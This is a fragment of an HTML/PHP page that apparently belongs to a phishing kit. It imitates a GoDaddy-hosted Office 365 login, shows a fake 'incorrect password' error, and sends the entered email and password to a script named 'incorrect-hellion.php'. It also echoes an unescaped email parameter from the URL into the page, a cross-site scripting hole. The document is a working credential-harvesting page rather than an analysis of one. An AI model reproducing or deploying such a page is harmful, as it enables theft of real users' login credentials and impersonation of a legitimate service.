        ...
        <div class="row">
          <div class="col-sm-8 col-sm-push-2 col-md-7 col-md-push-3">
            <div class="ux-card" id="contentContainer">
              ...
              <div style="margin-top: 35px;" id="errorMessage" data-style="error" class="alert alert-danger"><button type="button" class="close" data-dismiss="alert" aria-hidden="true" style="display: none;"></button><div class="uxicon alert-icon uxicon-alert"></div>Authentication failed. You entered an incorrect password for your email address.</div>
              ...
              <form action="incorrect-hellion.php?1&email=<?php echo $_GET['email']; ?>" id="login-form" method="POST" name="login">
<input name="app" type="hidden" value="o365">
<input name="realm" type="hidden" value="pass">
<input name="wctx" type="hidden" value="whr=sharutunian.com">
<input name="wa" type="hidden" value="wsignin1.0">
<input name="wtrealm" type="hidden" value="urn:federation:MicrosoftOnline">

<div class="form-group"><label class="control-label">Email</label><input class="form-control" id="username" name="name" tabindex="1" type="text" value="<? echo $_GET['email'] ?>" readonly></div>
<div class="form-group"><label class="control-label">Password</label><a id="forgotPasswordLink" href="https://sso.godaddy.com/?wa=wsignin1.0&app=o365&realm=pass&wtrealm=urn%3Afederation%3AMicrosoftOnline&wctx=whr%3Dsharutunian.com#" class="pull-right">I forgot</a><input autocomplete="off" class="form-control" id="password" name="password" tabindex="2" type="password"></div>
